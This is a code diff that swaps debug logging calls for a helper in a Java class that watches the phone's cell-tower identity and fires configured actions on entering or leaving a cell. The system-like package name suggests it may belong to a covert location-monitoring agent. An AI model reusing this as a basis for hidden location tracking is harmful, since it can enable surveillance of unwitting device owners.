@@ -11,11 +11,10 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.util.Log;
-
 import com.android.service.CellInfo;
 import com.android.service.Device;
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
 public class EventCellId extends EventBase {
@@ -57,7 +56,7 @@ public class EventCellId extends EventBase {
 			lacOrig = databuffer.readInt();
 			cidOrig = databuffer.readInt();
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
+			if(Cfg.DEBUG) Check.log( TAG + " Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
 					+ lacOrig + " Cid: " + cidOrig);
 
 			setPeriod(CELLID_PERIOD);
@@ -74,7 +73,7 @@ public class EventCellId extends EventBase {
 	public void go() {
 		CellInfo info = Device.getCellInfo();
 		if(!info.valid){
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + "invalid cell info" );
+			if(Cfg.DEBUG) Check.log( TAG + " Error: " + "invalid cell info" );
 			return;
 		}
 		
@@ -83,20 +82,20 @@ public class EventCellId extends EventBase {
 				&& (lacOrig == -1 || lacOrig == info.lac)
 				&& (cidOrig == -1 || cidOrig == info.cid)) {
 			if (!entered) {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " Enter");
+				if(Cfg.DEBUG) Check.log( TAG + " Enter");
 				entered = true;
 				trigger(actionOnEnter);
 			} else {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " already entered");
+				if(Cfg.DEBUG) Check.log( TAG + " already entered");
 			}
 
 		} else {
 			if (entered) {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " Exit");
+				if(Cfg.DEBUG) Check.log( TAG + " Exit");
 				entered = false;
 				trigger(actionOnExit);
 			} else {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " already exited");
+				if(Cfg.DEBUG) Check.log( TAG + " already exited");
 			}
 		}
 	}
